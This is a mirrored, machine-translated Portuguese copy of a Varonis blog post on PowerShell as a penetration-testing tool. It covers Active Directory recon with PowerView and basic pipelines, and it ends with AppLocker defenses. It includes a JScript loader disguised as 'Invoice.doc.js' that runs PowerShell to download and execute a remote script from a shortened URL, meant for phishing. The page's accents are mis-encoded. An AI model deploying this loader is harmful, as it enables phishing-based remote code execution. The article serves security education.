<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∞üèΩ üïµÔ∏è üò® PowerShell como uma ferramenta Pentest: scripts e exemplos Varonis üëÉüèª üëáüèª üéà</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Os hackers gostam de usar o PowerShell para executar "malware sem arquivo", malware incorp√≥reo que n√£o √© bin√°rio tradicional com c√≥digo malicioso comp...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PowerShell como uma ferramenta Pentest: scripts e exemplos Varonis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br><br>  Os hackers gostam de usar o PowerShell para executar "malware sem arquivo", malware incorp√≥reo que n√£o √© bin√°rio tradicional com c√≥digo malicioso compilado e, por esse motivo, √†s vezes n√£o pode ser detectado por solu√ß√µes antiv√≠rus. <br><br>  O PowerShell, √© claro, sempre teve um objetivo completamente normal, que no in√≠cio nada tinha a ver com o teste de penetra√ß√£o.  Aqueles de voc√™s que desejam conhecer os antecedentes do PowerShell devem ler o famoso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Manifesto da M√¥nada</a> .  Escrito por um dos desenvolvedores originais, este manifesto explica por que a Microsoft precisava de uma nova linguagem de script (em outras palavras, scripts), que acabou se transformando no PowerShell. <br><a name="habracut"></a><br>  Para poupar o trabalho de exibir um longo documento de 17 p√°ginas, vou revelar o principal fator motivador que motivou os autores do PowerShell: era para dar aos administradores de sistema acesso a objetos .Net na linha de comando, permitindo a automa√ß√£o do fluxo de trabalho no n√≠vel do sistema, em vez de no n√≠vel de programa√ß√£o profunda em C # ou C ++. <br><br>  Se voc√™ quiser uma evid√™ncia real da efic√°cia do PowerShell (a seguir denominado PS), pergunte aos administradores de sistema como eles adicionam usu√°rios massivamente ao Active Directory ou realizam configura√ß√µes r√°pidas de seguran√ßa.  Voc√™ provavelmente aprender√° sobre as <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">solu√ß√µes do PowerShell</a> .  Resumindo: o PS √© uma √≥tima maneira de reduzir a rotina e aumentar a produtividade dos administradores. <br><br><h2>  <font color="#D21927">Por que usar o PowerShell para pentests?</font> </h2><br>  Infelizmente, o que √© t√£o adequado como uma poderosa ferramenta de automa√ß√£o para administradores √©, em √∫ltima an√°lise, √∫til para hackers e testadores de penetra√ß√£o. <br><br>  Suponha que um administrador de TI tenha a tarefa de descobrir quem realmente usa um servidor sobrecarregado.  Usando o PowerShell e a biblioteca de fun√ß√µes avan√ßadas do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PowerView</a> , o administrador do sistema pode visualizar rapidamente os usu√°rios que est√£o conectados ao servidor <i>, sem a necessidade de</i> fazer logon no pr√≥prio servidor: <br><br><img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br><br>  No entanto, os invasores que obtiveram acesso atrav√©s de um ataque de phishing tamb√©m podem fazer o mesmo, como  eles podem usar os mesmos recursos enquanto estiverem em um dom√≠nio do Active Directory (a seguir denominado AD).  E suas atividades n√£o ser√£o necessariamente detectadas: um analista de seguran√ßa da informa√ß√£o que monitora o uso de aplicativos pode concluir que, por <i>ser apenas o PowerShell, deve ser inofensivo</i> . <br><br>  Para agravar ainda mais este exemplo, os hackers podem obter todas as informa√ß√µes detalhadas sobre usu√°rios individuais usando o comando Get-NetUser, que ir√° despejar todos os atributos do usu√°rio no AD: <br><br><img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br><br>  Infelizmente, √†s vezes as empresas negligenciam os atributos do AD que tornam p√∫blicas para todos os funcion√°rios - por exemplo, telefone residencial ou celular, endere√ßo etc.  Antes do PowerShell, era muito mais dif√≠cil coletar todos esses dados do AD, mas esse n√£o √© o caso! <br><br>  O que os atacantes podem fazer com essas informa√ß√µes?  Eles podem facilmente tirar proveito dos m√©todos de <i>engenharia social</i> e desenvolver um ataque para isso: talvez enviando <br>  Um email com contexto pessoal suficiente derivado dos atributos do AD para se parecer com uma solicita√ß√£o de suporte leg√≠tima solicitando que voc√™ ‚Äúredefina sua senha‚Äù. <br><br>  A prop√≥sito, voc√™ tamb√©m pode aplicar o controle ACL aos atributos do AD, portanto, existe uma maneira (!) De reduzir o risco de ataques desse tipo.  E este √© um daqueles resultados positivos que voc√™ pode obter com sua pr√≥pria experi√™ncia em testes de penetra√ß√£o. <br><br><img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br><br><h2>  <font color="#D21927">Tutorial do PowerShell Pentester</font> </h2><br>  Usando o PowerShell, os atacantes podem coletar discretamente dados internos do usu√°rio e us√°-los em seus ataques.  Mas n√£o h√° raz√£o para que o pessoal de TI ou de seguran√ßa da informa√ß√£o tamb√©m n√£o consiga aprender o PowerShell o suficiente para iniciar seus pr√≥prios testes e aprender a entender a mentalidade e os motivos do hacker. <br><br>  A primeira coisa legal do PowerShell √© que todos os scripts antigos e arquivos bat que voc√™ executou na linha de comando cmd.exe ainda funcionam no console do PowerShell.  J√° n√£o √© ruim, √©? <br><br>  O pr√≥ximo ponto importante √© que, diferentemente dos shells do tipo Linux, o PowerShell trata tudo como <i>um objeto</i> .  At√© a sa√≠da de um comando (somente pensar) tamb√©m √© um objeto. <br><br>  Por exemplo, digite o comando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Get-ChildItem</a> (ou o cmdlet de uma maneira diferente, como os comandos s√£o chamados no mundo do PS) no console e voc√™ ver√° uma lista de arquivos no diret√≥rio atual: <br><br><img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br><br><h3>  <font color="#D21927">Codifica√ß√£o do PowerShell</font> </h3><br>  Suponha que voc√™ queira escrever um script PS no qual apenas arquivos <i>maiores que 10 MB</i> sejam exibidos - por exemplo, para verificar rapidamente quais arquivos ocupam muito espa√ßo.  Essa tarefa ser√° muito mais dif√≠cil de resolver na sa√≠da da string, digamos, do shell bash.  No entanto, no PowerShell, a sa√≠da de qualquer comando √© um objeto com um conjunto de <i>atributos</i> . <br><br>  Para ver isso, basta passar a sa√≠da GetChildItem para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Get-Member</a> , que informar√° os atributos do cmdlet PS: <br><br><img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br><br>  Portanto, agora temos identificadores para dois atributos de interesse para n√≥s: o comprimento "length" e o nome "name", aos quais podemos nos referir programaticamente.  5 minutos - v√¥o normal. <br><br>  Para lidar com a situa√ß√£o frequente em que os objetos √†s vezes est√£o em matrizes ou cole√ß√µes, usaremos o operador PS <i>ForEach</i> para iterar sobre a matriz. <br><br>  Para facilitar ainda mais, um alias ou alias "%" significa "ForEach" e "$ _" representa o objeto atual. <br><br><h3>  <font color="#D21927">Executando comandos usando o PowerShell</font> </h3><br>  Vamos obter nossas duas colunas de sa√≠da da equipe GetChildItem com base em nosso novo conhecimento.  O exemplo abaixo √© um pipeline com Get-ChildItem que alimenta a instru√ß√£o ForEach, que exibe apenas os valores dos atributos "length" e "name": <br><br><pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator "`t`t"}</code> </pre> <br>  E aqui est√° o resultado da execu√ß√£o dos comandos: <br><br><img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br><br>  Para finalizar nosso maravilhoso exemplo, vamos ajustar nosso script para gerar apenas arquivos grandes, digamos, com mais de 10 MB.  Para fazer isso, usamos um filtro conhecido como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">cmdlet Where-Object</a> com o conveniente alias "?". Ele possui todos os operadores de compara√ß√£o usuais (-gt, -eq, -lt etc.). N√≥s o inserimos no meio do pipeline e o nosso o script agora fica assim: <br><br><pre> <code class="plaintext hljs"> get-ChildItem | ? {$_.length ‚Äìgt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code> </pre> <br>  Como exerc√≠cio, tente executar a cria√ß√£o do PS acima em seu pr√≥prio ambiente. <br><br><h2>  <font color="#D21927">Tutorial: Exemplo de teste de penetra√ß√£o do PowerShell</font> </h2><br>  Com essa pouca experi√™ncia com o PowerShell, estamos prontos para dar um exemplo muito real da vida real.  Uma das maneiras mais r√°pidas de entrar em um protesto √© usar o PowerShell para ocultar a carga √∫til.  Escrevemos sobre como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">faz√™-lo aqui</a> . <br><br>  A id√©ia √© ocultar nosso c√≥digo do PowerShell em um documento padr√£o do escrit√≥rio com o sufixo .doc.  De fato, o arquivo ter√° a extens√£o .js e, quando clicado, ativa o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">lan√ßamento de um script do Windows</a> para executar o JavaScript, que iniciar√° o c√≥digo interno do PowerShell. <br><br>  Um pouco confuso, certo?  Mas hackers reais usam n√£o um, mas v√°rios n√≠veis de aninhamento e ofusca√ß√£o, a fim de ocultar e confundir o ataque o m√°ximo poss√≠vel. <br><br><h3>  <font color="#D21927">Prepara√ß√£o do carregador de inicializa√ß√£o e carga √∫til</font> </h3><br>  Aqui est√° a apar√™ncia do script: <br><br><pre> <code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code> </pre> <br>  Voc√™ cola o c√≥digo acima em um arquivo de texto e o renomeia para algo como <i>Invoice.doc.js</i> .  O JavaScript acima atua como um carregador que √© executado usando os cmdlets <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">internos do</a> PowerShell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">NetWebClient</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Invoke-Expression</a> , que s√£o aliases com "%". <br><br>  O m√©todo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">DownloadString</a> do cmdlet NetWebClient extrai remotamente a carga √∫til real, que acaba fazendo todo o trabalho sujo para n√≥s. <br><br>  Voc√™ pode inserir seu pr√≥prio URL apontando para seu pr√≥prio programa de teste.  Bem, o cmdlet Invoke-Expression aceita o c√≥digo do nosso arquivo malicioso e o executa. <br><br><h3>  <font color="#D21927">Confira!</font> </h3><br>  No meu caso, a URL aponta para um projeto do Github que cont√©m um simples comando PS Write-Host que exibir√° uma mensagem inofensiva, mas importante para toda a humanidade.  Em um ataque real, um arquivo desse cen√°rio poderia muito bem ser anexado a uma lista de e-mails de phishing, o que atrairia um funcion√°rio desavisado para uma armadilha de curiosidade.  E a carga √∫til ser√° muito mais destrutiva. <br><br><img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br><br>  Voc√™ pode tentar isso em sua pr√≥pria instala√ß√£o.  E se todas as op√ß√µes acima funcionarem com √™xito, voc√™ ter√° mais uma tarefa urgente e importante, que deve ser realizada sem falhas. <br><br><h2>  <font color="#D21927">Benef√≠cios do teste de penetra√ß√£o</font> </h2><br><img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br><br>  Isso nos leva √†s raz√µes pelas quais fazemos testes de penetra√ß√£o.  Aqui est√£o tr√™s benef√≠cios reais que v√™m √† mente primeiro: <br><br><ol><li>  Ao explorar as equipes do PowerShell como um atacante, voc√™ entender√° como os hackers ‚Äúquebram‚Äù essa maravilhosa linguagem de script da pr√≥xima gera√ß√£o.  Considere a combina√ß√£o dos m√©todos DownloadString e Invoke-Expression, permitindo que os invasores extraiam c√≥digo malicioso remoto para o site da v√≠tima, <i>sem a</i> necessidade de salv√°-lo no meio. </li><li>  Este exerc√≠cio tamb√©m enfatiza o segredo de um hacker moderno.  Eu mostrei no exemplo acima um esquema de ataque que n√£o deixa nenhum arquivo por a√≠.  Portanto, voc√™ n√£o pode usar m√©todos padr√£o baseados em assinatura para detectar com seguran√ßa um ataque realizado usando o PowerShell.  √â banal, n√£o temos a assinatura do pr√≥prio malware para compara√ß√£o. </li><li>  √â prov√°vel que voc√™ comece a explorar maneiras de <i>restringir o</i> PowerShell e outros m√©todos baseados em script.  No final, o ataque come√ßa com um script; portanto, se as empresas dificultam a execu√ß√£o de scripts, elas podem reduzir significativamente seu perfil de risco. </li></ol><br>  Deixe-me elaborar sobre o √∫ltimo ponto.  Voc√™ provavelmente n√£o desejar√° banir completamente o PowerShell (ou JavaScript), pois essa √© uma parte fundamental do software do sistema Windows.  Felizmente, a Microsoft tem uma maneira de desativar seletivamente scripts (e outros execut√°veis) por meio do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">AppLocker</a> , uma vers√£o aprimorada das antigas Pol√≠ticas de Restri√ß√£o de Software nas modernas Pol√≠ticas de Grupo (GPOs). <br><br>  Isso pode parecer inacredit√°vel para os t√©cnicos, mas a maioria dos usu√°rios comuns n√£o precisa do PowerShell ou de outras linguagens de script para realizar seu trabalho di√°rio.  Isso, √© claro, √© chocante, eu sei!  O AppLocker, por exemplo, pode ser configurado para desativar o acesso ao PowerShell para as massas, enquanto permite que os administradores de sistema ainda fa√ßam seu trabalho duro. <br><br>  Os ataques baseados em script, incluindo aqueles relacionados a anexos de email, contam com os administradores para fornecer aos funcion√°rios permiss√µes de script excessivamente amplas.  E isso n√£o deveria ser assim! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt471420/">https://habr.com/ru/post/pt471420/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt471404/index.html">√â poss√≠vel ganhar mais trabalhando como engenheiro em outro pa√≠s?</a></li>
<li><a href="../pt471408/index.html">Uma alternativa aos inversores de fase de vibra√ß√£o: linhas de transmiss√£o (TQWT, ALT)</a></li>
<li><a href="../pt471412/index.html">Um post sobre um monte de lixo na √°rea de trabalho</a></li>
<li><a href="../pt471414/index.html">Sistema l√≠der de suporte t√©cnico. Como obtemos requisitos e desenvolvemos um servi√ßo em nuvem?</a></li>
<li><a href="../pt471418/index.html">O que o mercado de RV pode ensinar a um designer de jogos?</a></li>
<li><a href="../pt471424/index.html">The Story of Nitro, um servi√ßo de tradu√ß√£o profissional que ajuda os desenvolvedores com localiza√ß√£o e suporte multil√≠ngue</a></li>
<li><a href="../pt471426/index.html">Como a TI pode ajudar muito a fazenda coletiva "O Caminho do Comunismo" ou uma propriedade agr√≠cola</a></li>
<li><a href="../pt471430/index.html">Como negociar com um cr√≠tico interno</a></li>
<li><a href="../pt471432/index.html">Os vil√µes fones de ouvido Aftershokz, ou como a Marvel inspira e o que inspira</a></li>
<li><a href="../pt471434/index.html">Conectando-se automaticamente a uma confer√™ncia do Lync no Linux</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>